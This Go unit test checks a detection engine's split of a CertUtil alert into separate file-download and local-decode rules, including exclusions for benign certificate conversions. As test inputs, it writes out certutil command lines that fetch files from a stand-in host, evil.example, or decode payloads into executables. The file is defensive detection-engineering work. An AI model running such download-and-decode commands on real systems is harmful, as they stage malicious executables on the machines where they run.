package detection

import "testing"

// "CertUtil Used for File Download" used to match -urlcache/-verifyctl/-split
// AND -decode/-encode/-decodehex in one selection, so a purely offline
// `certutil -decode a.b64 a.exe` — no network activity whatsoever — raised an
// alert titled "for File Download". That was a confirmed false positive in the
// benign battery (docs/results/attack-scorecard-20260718.md).
//
// The two behaviours are different techniques (T1105 ingress vs T1140 decode)
// and an analyst triaging the alert needs to know which one happened, so the
// rule was split rather than just narrowed. The local rule excludes anything
// carrying a download option, so a real download-then-decode chain credits the
// download rule alone instead of double-firing.
func TestCertUtilDownloadVsLocalDecodeSplit(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	const downloadTitle = "CertUtil Used for File Download"
	const localDecodeTitle = "CertUtil Used for Local Base64 Decode"

	titlesFor := func(cmdline string) map[string]bool {
		event := map[string]interface{}{
			"type":         "process",
			"image_path":   `C:\Windows\System32\certutil.exe`,
			"command_line": cmdline,
		}
		addPipelineSigmaAliases(event)
		got := map[string]bool{}
		for _, m := range ev.EvaluateEvent(event) {
			got[m.RuleTitle] = true
		}
		return got
	}

	cases := []struct {
		name         string
		cmdline      string
		wantDownload bool
		wantLocal    bool
	}{
		{
			name:         "offline decode only",
			cmdline:      `certutil -decode payload.b64 payload.exe`,
			wantDownload: false,
			wantLocal:    true,
		},
		{
			name:         "offline encode only",
			cmdline:      `certutil -encode payload.exe payload.b64`,
			wantDownload: false,
			wantLocal:    true,
		},
		{
			name:         "offline decodehex only",
			cmdline:      `certutil -decodehex payload.hex payload.exe`,
			wantDownload: false,
			wantLocal:    true,
		},
		{
			name:         "urlcache download",
			cmdline:      `certutil -urlcache -split -f http://evil.example/p.exe p.exe`,
			wantDownload: true,
			wantLocal:    false,
		},
		{
			// Both options present: the download is the more serious finding and
			// must own the alert; the local rule must not add a second one.
			name:         "download that also decodes",
			cmdline:      `certutil -urlcache -f http://evil.example/p.b64 p.b64 && certutil -urlcache -decode p.b64 p.exe`,
			wantDownload: true,
			wantLocal:    false,
		},
		{
			name:         "verifyctl fetch",
			cmdline:      `certutil -verifyctl -f -split http://evil.example/ctl`,
			wantDownload: true,
			wantLocal:    false,
		},
		// Benign certificate-format conversion. The FP soak measured this firing
		// 6 times on the it-admin profile (2026-08-03) — splitting the rule moved
		// the false positive from T1105 to T1140 instead of removing it, which is
		// no gain for the analyst who still has to triage it.
		//
		// Excluding by certificate extension (not by "output looks executable")
		// keeps `payload.b64 -> payload.dat` detectable; see the cases below.
		{
			name:         "benign base64 cert decoded to .cer",
			cmdline:      `certutil -decode C:\Temp\rootca.b64 C:\Temp\rootca.cer`,
			wantDownload: false,
			wantLocal:    false,
		},
		{
			name:         "benign cert encoded to base64",
			cmdline:      `certutil -encode C:\Temp\client.cer C:\Temp\client.b64`,
			wantDownload: false,
			wantLocal:    false,
		},
		{
			// The exclusion must not become a blanket amnesty for -decode. A
			// payload dropped under a neutral extension is the case the rule
			// exists for, and it stays caught.
			name:         "payload decoded to a neutral extension",
			cmdline:      `certutil -decode payload.b64 payload.dat`,
			wantDownload: false,
			wantLocal:    true,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := titlesFor(c.cmdline)
			if got[downloadTitle] != c.wantDownload {
				t.Errorf("%q fired=%v, want %v", downloadTitle, got[downloadTitle], c.wantDownload)
			}
			if got[localDecodeTitle] != c.wantLocal {
				t.Errorf("%q fired=%v, want %v", localDecodeTitle, got[localDecodeTitle], c.wantLocal)
			}
		})
	}
}
